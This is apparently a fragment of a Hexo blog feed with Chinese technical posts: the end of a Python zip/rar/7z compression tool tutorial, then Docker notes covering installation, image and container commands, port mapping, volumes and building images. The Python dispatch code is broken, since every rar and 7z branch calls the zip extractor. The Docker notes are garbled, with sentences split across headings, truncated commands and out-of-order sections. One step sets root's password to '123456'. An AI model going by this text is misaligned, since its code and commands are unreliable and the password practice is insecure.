class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">un_rar</span>(<span class="params">source_file, target_</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    rar文件解压缩</span></span><br><span class="line"><span class="string">    :param source_file: 原始文件</span></span><br><span class="line"><span class="string">    :param target_: 目标文件路径</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    obj_ = rar.RarFile(source_file.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    obj_.extractall(target_.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>接下来开始进入正题了，首先使用print函数打印一下菜单选项，可以让用户在启动软件后进行菜单的选择。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========PYTHON工具：文件解压缩软件==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;说明：目前支持zip、7z、rar格式&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1、文件解压缩格式：zip/rar/7z&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2、文件操作类型(压缩/解压)：Y/N&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3、文件路径选择，需要输入相应的操作文件路径&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========PYTHON工具：文件解压缩软件==========&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用input函数接收用户输入的文件解压缩格式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">format_ = <span class="built_in">input</span>(<span class="string">&#x27;请输入文件解压缩的格式：\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用input函数接收用户输入的文件操作类型（压缩&#x2F;解压）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type_ = <span class="built_in">input</span>(<span class="string">&#x27;请输入文件操作的类型：\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用input函数接收用户输入的需要操作的文件路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source_ = <span class="built_in">input</span>(<span class="string">&#x27;请输入原始文件的存储路径（文件或目录）：\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用input函数接收用户输入的生成的新文件的目标路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target_ = <span class="built_in">input</span>(<span class="string">&#x27;请输入目标文件的存储路径（文件或目录）：\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>为了保持输入的灵活性，加入不同格式不同操作类型的业务判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> format_ == <span class="string">&#x27;zip&#x27;</span> <span class="keyword">and</span> type_ == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">    do_zip(source_, target_)</span><br><span class="line"><span class="keyword">elif</span> format_ == <span class="string">&#x27;zip&#x27;</span> <span class="keyword">and</span> type_ == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">    un_zip(source_, target_)</span><br><span class="line"><span class="keyword">elif</span> format_ == <span class="string">&#x27;rar&#x27;</span> <span class="keyword">and</span> type_ == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">    un_zip(source_, target_)</span><br><span class="line"><span class="keyword">elif</span> format_ == <span class="string">&#x27;rar&#x27;</span> <span class="keyword">and</span> type_ == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">    un_zip(source_, target_)</span><br><span class="line"><span class="keyword">elif</span> format_ == <span class="string">&#x27;7z&#x27;</span> <span class="keyword">and</span> type_ == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">    un_zip(source_, target_)</span><br><span class="line"><span class="keyword">elif</span> format_ == <span class="string">&#x27;7z&#x27;</span> <span class="keyword">and</span> type_ == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">    un_zip(source_, target_)</span><br></pre></td></tr></table></figure><p>目前功能点是做了三种格式，后期若是需要可能会扩展升级当前的版本。欢迎大家在评论区留言，提供比较新的思路~</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 函数 </tag>
            
            <tag> 文件 </tag>
            
            <tag> zip </tag>
            
            <tag> import </tag>
            
            <tag> 压缩 </tag>
            
            <tag> target_ </tag>
            
            <tag> source_ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/posts/f52177d9e0d7/"/>
      <url>/posts/f52177d9e0d7/</url>
      
        <content type="html"><![CDATA[<h2 id="bios开机自检–根据bios启动项–读取硬盘第一个扇区"><a href="#bios开机自检–根据bios启动项–读取硬盘第一个扇区" class="headerlink" title="bios开机自检–根据bios启动项–读取硬盘第一个扇区"></a>bios开机自检–根据bios启动项–读取硬盘第一个扇区</h2><h2 id="grub-uefi-centos7-加载内核-启动系统第一个进"><a href="#grub-uefi-centos7-加载内核-启动系统第一个进" class="headerlink" title="grub,uefi, centos7, 加载内核,启动系统第一个进"></a>grub,uefi, centos7, 加载内核,启动系统第一个进</h2><h2 id="程-x2F-sbin-x2F-init-systemd"><a href="#程-x2F-sbin-x2F-init-systemd" class="headerlink" title="程&#x2F;sbin&#x2F;init systemd"></a>程&#x2F;sbin&#x2F;init systemd</h2><h2 id="容器-不需要硬件cpu的支持-共用宿主机内核-启动容器的"><a href="#容器-不需要硬件cpu的支持-共用宿主机内核-启动容器的" class="headerlink" title="容器: 不需要硬件cpu的支持,共用宿主机内核,启动容器的"></a>容器: 不需要硬件cpu的支持,共用宿主机内核,启动容器的</h2><h2 id="第一个进程"><a href="#第一个进程" class="headerlink" title="第一个进程"></a>第一个进程</h2><h2 id="容器优势-启动快-性能高-损耗少-轻量级"><a href="#容器优势-启动快-性能高-损耗少-轻量级" class="headerlink" title="容器优势: 启动快,性能高,损耗少,轻量级"></a>容器优势: 启动快,性能高,损耗少,轻量级</h2><h2 id="100-虚拟机-100-个服务-10-宿主机"><a href="#100-虚拟机-100-个服务-10-宿主机" class="headerlink" title="100 虚拟机 100 个服务 10 宿主机"></a>100 虚拟机 100 个服务 10 宿主机</h2><h2 id="100-容器-100-个服务-6-宿主机"><a href="#100-容器-100-个服务-6-宿主机" class="headerlink" title="100 容器 100 个服务 6 宿主机"></a>100 容器 100 个服务 6 宿主机</h2><h1 id="0-1-什么是docker"><a href="#0-1-什么是docker" class="headerlink" title="0. 1 什么是docker"></a>0. 1 什么是docker</h1><h2 id="docker是一种打包技术"><a href="#docker是一种打包技术" class="headerlink" title="docker是一种打包技术"></a>docker是一种打包技术</h2><h2 id="虚拟化的技术就是用来解决宿主机与虚拟机之间的耦合"><a href="#虚拟化的技术就是用来解决宿主机与虚拟机之间的耦合" class="headerlink" title="虚拟化的技术就是用来解决宿主机与虚拟机之间的耦合"></a>虚拟化的技术就是用来解决宿主机与虚拟机之间的耦合</h2><h2 id="问题（简称“解耦”）-传统虚拟化技术是属于完全解耦"><a href="#问题（简称“解耦”）-传统虚拟化技术是属于完全解耦" class="headerlink" title="问题（简称“解耦”）,传统虚拟化技术是属于完全解耦"></a>问题（简称“解耦”）,传统虚拟化技术是属于完全解耦</h2><h2 id="的，而docker这种虚拟化技术是属于半解耦的。"><a href="#的，而docker这种虚拟化技术是属于半解耦的。" class="headerlink" title="的，而docker这种虚拟化技术是属于半解耦的。"></a>的，而docker这种虚拟化技术是属于半解耦的。</h2><h2 id="耦合：就是指两个或两个以上的体系或两种运动形式间"><a href="#耦合：就是指两个或两个以上的体系或两种运动形式间" class="headerlink" title="耦合：就是指两个或两个以上的体系或两种运动形式间"></a>耦合：就是指两个或两个以上的体系或两种运动形式间</h2><h2 id="通过相互作用而彼此影响以至联合起来的现象；"><a href="#通过相互作用而彼此影响以至联合起来的现象；" class="headerlink" title="通过相互作用而彼此影响以至联合起来的现象；"></a>通过相互作用而彼此影响以至联合起来的现象；</h2><h2 id="解耦：接触耦合、冲突现象；"><a href="#解耦：接触耦合、冲突现象；" class="headerlink" title="解耦：接触耦合、冲突现象；"></a>解耦：接触耦合、冲突现象；</h2><h2 id="Docker是如何解耦的呢？这就需要使用到-——"><a href="#Docker是如何解耦的呢？这就需要使用到-——" class="headerlink" title="Docker是如何解耦的呢？这就需要使用到 ——"></a>Docker是如何解耦的呢？这就需要使用到 ——</h2><h2 id="Namespace（命名空间）。"><a href="#Namespace（命名空间）。" class="headerlink" title="Namespace（命名空间）。"></a>Namespace（命名空间）。</h2><h2 id="Namespace（命名空间）：是Linux为我们提供的用于分"><a href="#Namespace（命名空间）：是Linux为我们提供的用于分" class="headerlink" title="Namespace（命名空间）：是Linux为我们提供的用于分"></a>Namespace（命名空间）：是Linux为我们提供的用于分</h2><h2 id="离进程树、网络接口、挂载点以及进程间通信等资源的"><a href="#离进程树、网络接口、挂载点以及进程间通信等资源的" class="headerlink" title="离进程树、网络接口、挂载点以及进程间通信等资源的"></a>离进程树、网络接口、挂载点以及进程间通信等资源的</h2><h2 id="方法。"><a href="#方法。" class="headerlink" title="方法。"></a>方法。</h2><h2 id="主机名-内存-ip"><a href="#主机名-内存-ip" class="headerlink" title="主机名 内存 ip"></a>主机名 内存 ip</h2><h2 id="docker01-2G-10-0-0-1-1"><a href="#docker01-2G-10-0-0-1-1" class="headerlink" title="docker01 2G 10.0.0.1 1"></a>docker01 2G 10.0.0.1 1</h2><h2 id="docker02-2G-10-0-0"><a href="#docker02-2G-10-0-0" class="headerlink" title="docker02 2G 10.0.0."></a>docker02 2G 10.0.0.</h2><h2 id="Namespace（命名空间）在docker中主要实现了六项隔离"><a href="#Namespace（命名空间）在docker中主要实现了六项隔离" class="headerlink" title="Namespace（命名空间）在docker中主要实现了六项隔离"></a>Namespace（命名空间）在docker中主要实现了六项隔离</h2><h1 id="0-1-3-docker-ce的安装"><a href="#0-1-3-docker-ce的安装" class="headerlink" title="0. 1 3:docker-ce的安装"></a>0. 1 3:docker-ce的安装</h1><h3 id="UTS-主机和域名"><a href="#UTS-主机和域名" class="headerlink" title="UTS 主机和域名"></a>UTS 主机和域名</h3><h3 id="IPC-信号量、消息队列和共享内容"><a href="#IPC-信号量、消息队列和共享内容" class="headerlink" title="IPC 信号量、消息队列和共享内容"></a>IPC 信号量、消息队列和共享内容</h3><h3 id="PID-进程编号"><a href="#PID-进程编号" class="headerlink" title="PID 进程编号"></a>PID 进程编号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">network 网络设备、网络栈、端口等</span><br><span class="line">mount 挂载点(文件系统)</span><br><span class="line">user 用户和用户组</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#安装docker-ce</span><br><span class="line">wget -O /etc/yum.repos.d/docker-ce.repo</span><br><span class="line">https://download.docker.com/linux/centos/dock</span><br><span class="line">er-ce.repo</span><br><span class="line">sed -i</span><br><span class="line">&#x27;s+download.docker.com+mirrors.tuna.tsinghua.</span><br><span class="line">edu.cn/docker-ce+&#x27; /etc/yum.repos.d/docker-</span><br><span class="line">ce.repo</span><br><span class="line">yum install docker-ce -y</span><br></pre></td></tr></table></figure><h1 id="0-1-4-docker主要内容"><a href="#0-1-4-docker主要内容" class="headerlink" title="0. 1 4:docker主要内容"></a>0. 1 4:docker主要内容</h1><h2 id="docker是一个cs架构-docker主要-镜像-容器-仓库-网络"><a href="#docker是一个cs架构-docker主要-镜像-容器-仓库-网络" class="headerlink" title="docker是一个cs架构, docker主要:镜像 容器 仓库 网络"></a>docker是一个cs架构, docker主要:镜像 容器 仓库 网络</h2><h2 id="存储-监控"><a href="#存储-监控" class="headerlink" title="存储 监控"></a>存储 监控</h2><h2 id="docker是一个软件的打包技术"><a href="#docker是一个软件的打包技术" class="headerlink" title="docker是一个软件的打包技术."></a>docker是一个软件的打包技术.</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&quot;registry-mirrors&quot;: [</span><br><span class="line">&quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">&quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#验证</span><br><span class="line">[root@docker01 yum.repos.d]# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line">Version: 19 .03.</span><br><span class="line">API version: 1.</span><br><span class="line">Go version: go1.12.</span><br><span class="line">Git commit: 633a0ea</span><br><span class="line">Built: Wed Nov 13 07 :25:41 2019</span><br><span class="line">OS/Arch: linux/amd</span><br><span class="line">Experimental: false</span><br></pre></td></tr></table></figure><h1 id="0-1-5-docker镜像常用命令"><a href="#0-1-5-docker镜像常用命令" class="headerlink" title="0. 1 5:docker镜像常用命令"></a>0. 1 5:docker镜像常用命令</h1><h1 id="0-1-6-docker容器的常用命令"><a href="#0-1-6-docker容器的常用命令" class="headerlink" title="0. 1 6:docker容器的常用命令"></a>0. 1 6:docker容器的常用命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80 :80 nginx:latest</span><br><span class="line">run 创建并启动一个容器</span><br><span class="line">-d 放后台启动</span><br><span class="line">-p 端口映射</span><br><span class="line">nginx:latest docker镜像名称</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker search 搜索镜像, 优先选官方,stars数量多</span><br><span class="line">docker pull 拉取镜像(下载镜像)</span><br><span class="line">docker push 推送镜像(上传镜像)</span><br><span class="line">docker load 导入镜像</span><br><span class="line">例子: docker load -i docker_nginx.tar.gz</span><br><span class="line">docker save 导出镜像</span><br><span class="line">例子:docker save centos:7 -o</span><br><span class="line">docker_centos7.tar.gz</span><br><span class="line">docker images 查看镜像列表</span><br><span class="line">docker rmi 删除镜像</span><br><span class="line">docker tag 给镜像打标签</span><br></pre></td></tr></table></figure><h2 id="容器想要放在后台一直运行的化-那么容器的初始命令-必"><a href="#容器想要放在后台一直运行的化-那么容器的初始命令-必" class="headerlink" title="容器想要放在后台一直运行的化,那么容器的初始命令,必"></a>容器想要放在后台一直运行的化,那么容器的初始命令,必</h2><h2 id="须夯住-前台运行-否则容器就会退出"><a href="#须夯住-前台运行-否则容器就会退出" class="headerlink" title="须夯住(前台运行),否则容器就会退出."></a>须夯住(前台运行),否则容器就会退出.</h2><h1 id="0-1-7-docker端口映射"><a href="#0-1-7-docker端口映射" class="headerlink" title="0. 1 7:docker端口映射"></a>0. 1 7:docker端口映射</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">docker run 创建并启动容器</span><br><span class="line">例子:docker run -d -it -p 80 :</span><br><span class="line">nginx:latest</span><br><span class="line">docker create 创建容器 --name</span><br><span class="line">docker start 启动容器</span><br><span class="line">docker stop 停止容器</span><br><span class="line">docker restart 重启容器</span><br><span class="line">docker kill 强制停止容器</span><br><span class="line">docker ps 查看容器列表 -a 查看所有容器</span><br><span class="line">docker rm 删除容器</span><br><span class="line">批量删除所有容器 docker rm -f `docker ps -</span><br><span class="line">a -q`</span><br><span class="line">docker exec 进入正在运行的容器(分配一个新终</span><br><span class="line">端)</span><br><span class="line">例子: docker exec -it 容器id/容器名字</span><br><span class="line">/bin/bash(/bin/sh)</span><br><span class="line">docker attach 进入正在运行的容器(使用相同的终</span><br><span class="line">端),偷偷离开的快捷键ctrl +p,ctrl +q</span><br></pre></td></tr></table></figure><h3 id="前台运行"><a href="#前台运行" class="headerlink" title="前台运行"></a>前台运行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -g &#x27;daemon off;&#x27;</span><br><span class="line">/usr/sbin/php-fpm --nodaemonize</span><br></pre></td></tr></table></figure><h1 id="0-1-8-docker数据卷"><a href="#0-1-8-docker数据卷" class="headerlink" title="0. 1 8:docker数据卷"></a>0. 1 8:docker数据卷</h1><h2 id="小练习-只启动一个nginx容器-要求访问-80-端口-出现"><a href="#小练习-只启动一个nginx容器-要求访问-80-端口-出现" class="headerlink" title="小练习: 只启动一个nginx容器,要求访问 80 端口,出现"></a>小练习: 只启动一个nginx容器,要求访问 80 端口,出现</h2><h2 id="nginx默认欢迎首页-访问-81-端口-出现小鸟飞飞"><a href="#nginx默认欢迎首页-访问-81-端口-出现小鸟飞飞" class="headerlink" title="nginx默认欢迎首页,访问 81 端口,出现小鸟飞飞."></a>nginx默认欢迎首页,访问 81 端口,出现小鸟飞飞.</h2><h1 id="0-1-9-手动制作docker镜像"><a href="#0-1-9-手动制作docker镜像" class="headerlink" title="0. 1 9:手动制作docker镜像"></a>0. 1 9:手动制作docker镜像</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run</span><br><span class="line">-p 宿主机端口:容器端口</span><br><span class="line">-p 宿主机ip1:宿主机端口:容器端口 (多个容器同时</span><br><span class="line">使用 80 端口)</span><br><span class="line">-p 宿主机ip1::容器端口 随机端口映射</span><br><span class="line">-p 宿主机ip1::容器端口/udp 使用udp协议做随机</span><br><span class="line">端口映射</span><br><span class="line">-p 80 :80 -p 3306 :</span><br><span class="line">-p 1111 -1119:1111-1119 端口范围映射</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run</span><br><span class="line">-v 宿主机绝对目录:容器目录</span><br><span class="line">-v 容器目录 #创建一个随机卷,来持久化容器</span><br><span class="line">的目录下的数据</span><br><span class="line">-v 卷名:容器目录 #创建一个固定名字的卷,来持</span><br><span class="line">久化容器的目录下的数据</span><br><span class="line">--volumes-from 跟某一个容器挂载所有相同的卷</span><br></pre></td></tr></table></figure><h2 id="制作一个基于centos6系统的nginx镜像-单服务"><a href="#制作一个基于centos6系统的nginx镜像-单服务" class="headerlink" title="制作一个基于centos6系统的nginx镜像(单服务)"></a>制作一个基于centos6系统的nginx镜像(单服务)</h2><h2 id="制作一个基于centos6系统的kod网盘的镜像-多服务"><a href="#制作一个基于centos6系统的kod网盘的镜像-多服务" class="headerlink" title="制作一个基于centos6系统的kod网盘的镜像(多服务)"></a>制作一个基于centos6系统的kod网盘的镜像(多服务)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1 :启动一个纯净的centos:6.9容器,安装nginx</span><br><span class="line">echo &#x27;192.168.12.201 mirrors.aliyun.com&#x27;</span><br><span class="line">&gt;&gt;/etc/hosts</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line">curl -o /etc/yum.repos.d/epel.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/epel-6.repo</span><br><span class="line">yum install nginx -y</span><br><span class="line">2 :把安装好服务的容器,提交为镜像</span><br><span class="line">docker container commit eb109f</span><br><span class="line">centos6.9_nginx:v</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3 :测试镜像的功能</span><br><span class="line">docker run -d -p 82 :80 centos6.9_nginx:v</span><br><span class="line">nginx -g &#x27;daemon off;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 :启动一个centos6.9_nginx:v1,再安装php</span><br><span class="line">echo &#x27;192.168.12.201 mirrors.aliyun.com&#x27;</span><br><span class="line">&gt;&gt;/etc/hosts</span><br><span class="line">yum install php-fpm php-gd php-mbstring -y</span><br><span class="line">vi /etc/php-fpm.d/www.conf</span><br><span class="line">service php-fpm start</span><br><span class="line">cd /etc/nginx/conf.d/</span><br><span class="line">vi default.conf</span><br><span class="line">mkdir /html</span><br><span class="line">cd /html</span><br></pre></td></tr></table></figure><h2 id="制作一个基于centos7系统的nginx-sshd双服务镜像"><a href="#制作一个基于centos7系统的nginx-sshd双服务镜像" class="headerlink" title="制作一个基于centos7系统的nginx+sshd双服务镜像"></a>制作一个基于centos7系统的nginx+sshd双服务镜像</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget</span><br><span class="line">http://192.168.19.200/191127/kodexplorer4.40.</span><br><span class="line">zip</span><br><span class="line">curl -o kodexplorer4.40.zip</span><br><span class="line">http://192.168.19.200/191127/kodexplorer4.40.</span><br><span class="line">zip</span><br><span class="line">yum install unzip -y</span><br><span class="line">unzip kodexplorer4.40.zip</span><br><span class="line">chown -R nginx:nginx.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /init.sh</span><br><span class="line">#!/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service php-fpm start</span><br><span class="line">nginx -g &#x27;daemon off;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2 :把安装好服务的容器,提交为镜像</span><br><span class="line">docker commit 47208e3e3796 kod:v</span><br><span class="line">3 :测试镜像的功能</span><br><span class="line">docker run -d -p 83 :80 kod:v2 /bin/bash</span><br><span class="line">/init.sh</span><br></pre></td></tr></table></figure><h1 id="0-1-10-自动制作docker镜像"><a href="#0-1-10-自动制作docker镜像" class="headerlink" title="0. 1 10:自动制作docker镜像"></a>0. 1 10:自动制作docker镜像</h1><h2 id="镜像：-中药"><a href="#镜像：-中药" class="headerlink" title="镜像： 中药"></a>镜像： 中药</h2><h2 id="dockerfile：-配方"><a href="#dockerfile：-配方" class="headerlink" title="dockerfile： 配方"></a>dockerfile： 配方</h2><h2 id="dockerfile常用指令"><a href="#dockerfile常用指令" class="headerlink" title="dockerfile常用指令"></a>dockerfile常用指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">curl -o /etc/yum.repos.d/epel.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/epel-7.repo</span><br><span class="line">yum install nginx -y</span><br><span class="line">yum install openssh-server -y</span><br><span class="line">yum install initscripts -y</span><br><span class="line">/usr/sbin/sshd-keygen</span><br><span class="line">echo &#x27;123456&#x27;|passwd --stdin root</span><br><span class="line">/usr/sbin/sshd -D</span><br><span class="line">vi /init.sh</span><br></pre></td></tr></table></figure><h2 id="根据dockerfile自动构建镜像的思路"><a href="#根据dockerfile自动构建镜像的思路" class="headerlink" title="根据dockerfile自动构建镜像的思路"></a>根据dockerfile自动构建镜像的思路</h2><h2 id="dockerfile单服务例子-1-："><a href="#dockerfile单服务例子-1-：" class="headerlink" title="dockerfile单服务例子 1 ："></a>dockerfile单服务例子 1 ：</h2><h3 id="FROM-基础镜像"><a href="#FROM-基础镜像" class="headerlink" title="FROM 基础镜像"></a>FROM 基础镜像</h3><h3 id="RUN-制作镜像过程中需要的执行命令"><a href="#RUN-制作镜像过程中需要的执行命令" class="headerlink" title="RUN 制作镜像过程中需要的执行命令"></a>RUN 制作镜像过程中需要的执行命令</h3><h3 id="CMD-容器启动的时候执行的初始命令，容易被替换"><a href="#CMD-容器启动的时候执行的初始命令，容易被替换" class="headerlink" title="CMD 容器启动的时候执行的初始命令，容易被替换"></a>CMD 容器启动的时候执行的初始命令，容易被替换</h3><h3 id="ENTRYPOINT-容器启动的时候执行的初始命令，不能被"><a href="#ENTRYPOINT-容器启动的时候执行的初始命令，不能被" class="headerlink" title="ENTRYPOINT 容器启动的时候执行的初始命令，不能被"></a>ENTRYPOINT 容器启动的时候执行的初始命令，不能被</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">替换，如果同时使用CMD和ENTRYPOINT，cmd命令将作为</span><br><span class="line">ENTRYPOINT命令的参数</span><br><span class="line">ADD 把dockerfile当前目录下的文件拷贝到容器中</span><br><span class="line">（自动解压tar包）</span><br><span class="line">COPY 把dockerfile当前目录下的文件拷贝到容器中</span><br><span class="line">（不解压tar包）</span><br><span class="line">WORKDIR 指定容器的默认工作目录</span><br><span class="line">EXPOSE 镜像要暴露的端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:手动制作docker镜像，记录历史命令</span><br><span class="line">b：根据历史命令编写dockerfile文件</span><br><span class="line">c：docker build构建docker镜像</span><br><span class="line">d：测试镜像的功能</span><br></pre></td></tr></table></figure><h2 id="dockerfile多服务例子-2-："><a href="#dockerfile多服务例子-2-：" class="headerlink" title="dockerfile多服务例子 2 ："></a>dockerfile多服务例子 2 ：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 